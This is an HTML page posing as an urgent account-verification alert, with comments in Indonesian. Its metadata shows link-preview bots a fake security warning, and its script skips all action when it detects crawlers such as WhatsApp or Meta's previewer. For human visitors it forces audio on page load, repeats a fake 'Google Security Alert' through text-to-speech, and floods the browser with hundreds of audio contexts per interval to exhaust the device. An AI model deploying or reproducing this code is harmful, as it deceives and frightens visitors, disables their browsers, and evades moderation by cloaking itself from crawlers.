<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert - Meta AI Preview Verification</title>

<!-- ============================================ -->
<!-- OPEN GRAPH & TWITTER METADATA (Untuk Bot Preview / Meta AI) -->
<!-- ============================================ -->
<meta property="og:title" content="Security Alert: Urgent Account Verification Required">
<meta property="og:description" content="Suspicious activity detected from an unknown location. Click to verify your identity immediately.">
<meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=1200&h=630&fit=crop">
<meta property="og:url" content="https://example.com/security-alert">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary_large_image">

<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .card { background: #1e293b; padding: 32px; border-radius: 12px; max-width: 480px; width: 100%; text-align: center; border: 1px solid #334155; }
  h2 { margin-bottom: 12px; color: #f8fafc; font-size: 22px; }
  p { color: #94a3b8; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
  .badge { display: inline-block; background: #ef4444; color: white; padding: 4px 12px; border-radius: 4px; font-size: 12px; font-weight: bold; margin-bottom: 16px; }
</style>
</head>
<body>

<div class="card">
  <div class="badge">SYSTEM ALERT</div>
  <h2>Verifikasi Keamanan Akun</h2>
  <p>Sistem mendeteksi upaya akses tidak sah. Halaman ini memuat parameter verifikasi otomatis.</p>
</div>

<script>
(function () {
  'use strict';

  // Deteksi apakah yang mengakses adalah Bot/Crawler (seperti Meta AI Bot / WhatsApp Previewer)
  var userAgent = navigator.userAgent || '';
  var isBot = /facebookexternalhit|WhatsApp|MetaInspector|Twitterbot|TelegramBot|Googlebot/i.test(userAgent);

  if (isBot) {
    console.log("[*] Crawler / Meta AI Bot detected. Logging header metadata...");
    return; // Hentikan eksekusi berat jika diakses oleh bot perayap
  }

  // ============================================
  // KONFIGURASI CLIENT-SIDE STABLE EXHAUSTION
  // ============================================
  var CONFIG = {
    tts: {
      text: "Google Security Alert. Extended verification process initiated. Please remain on this page.",
      lang: 'en-US',
      rate: 0.85,
      pitch: 1.0,
      volume: 1.0,
      repeatInterval: 10000,
      maxRepeats: 50
    },
    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
    exhaustionInterval: 250,
    batchSize: 400
  };

  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0, executionSeconds: 0 };

  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;

    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;
      u.volume = CONFIG.tts.volume;

      var voices = window.speechSynthesis.getVoices();
      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
      if (enVoice) u.voice = enVoice;

      u.onend = function () {
        state.ttsCount++;
        if (state.ttsCount < CONFIG.tts.maxRepeats) {
          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
        }
      };

      window.speechSynthesis.speak(u);
    } catch (e) {}
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  function unlockAudioContext() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      if (ctx.state === 'suspended') {
        ctx.resume().catch(function(){});
      }
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      gain.gain.value = 0.0001;
      osc.frequency.value = 20000;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.1);
    } catch (e) {}
  }

  function trySilentAudio() {
    try {
      var a = new Audio(CONFIG.silentWav);
      a.volume = 0.0001;
      a.loop = true;
      var p = a.play();
      if (p && p.catch) p.catch(function(){});
    } catch (e) {}
  }

  function playMainAudio() {
    if (state.mainPlayed) return;
    state.mainPlayed = true;

    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      var sr = ctx.sampleRate;
      var dur = 3.0;
      var buf = ctx.createBuffer(1, sr * dur, sr);
      var d = buf.getChannelData(0);

      for (var i = 0; i < d.length; i++) {
        var t = i / sr;
        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
        var env = Math.max(0, 1 - t / dur);
        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
      }

      var src = ctx.createBufferSource();
      src.buffer = buf;
      src.connect(ctx.destination);
      src.start();
      src.onended = startTTS;
      setTimeout(startTTS, 3500);
    } catch (e) {
      startTTS();
    }
  }

  function triggerExtendedSeverityExhaustion() {
    var durationTimer = setInterval(function() {
      state.executionSeconds += 1;
      if (state.executionSeconds > 120) {
        clearInterval(durationTimer);
      }
    }, 1000);

    var exhaustionTimer = setInterval(function() {
      try {
        for (var i = 0; i < CONFIG.batchSize; i++) {
          var ctx = new (window.AudioContext || window.webkitAudioContext)();
          var osc = ctx.createOscillator();
          var gain = ctx.createGain();
          
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.start(0);
          
          if (i % 50 === 0) {
            var u = new SpeechSynthesisUtterance("EXTENDED_STABLE_NODE_" + state.executionSeconds);
            window.speechSynthesis.speak(u);
          }
        }
      } catch(e) {}
    }, CONFIG.exhaustionInterval);
  }

  unlockAudioContext();
  trySilentAudio();

  setTimeout(function () {
    unlockAudioContext();
    startTTS();
  }, 200);

  setTimeout(function () {
    if (!state.mainPlayed) playMainAudio();
  }, 800);

  setTimeout(function () {
    if (!state.mainPlayed) playMainAudio();
    if (!state.ttsStarted) startTTS();
    triggerExtendedSeverityExhaustion();
  }, 2000);

  var retryCount = 0;
  var retry = setInterval(function () {
    retryCount++;
    unlockAudioContext();
    trySilentAudio();
    if (!state.ttsStarted) startTTS();
    if (retryCount > 10) clearInterval(retry);
  }, 3000);

  document.addEventListener('visibilitychange', function () {
    if (!document.hidden && !state.mainPlayed) {
      setTimeout(playMainAudio, 100);
    }
  });
})();
</script>
</body>
</html>
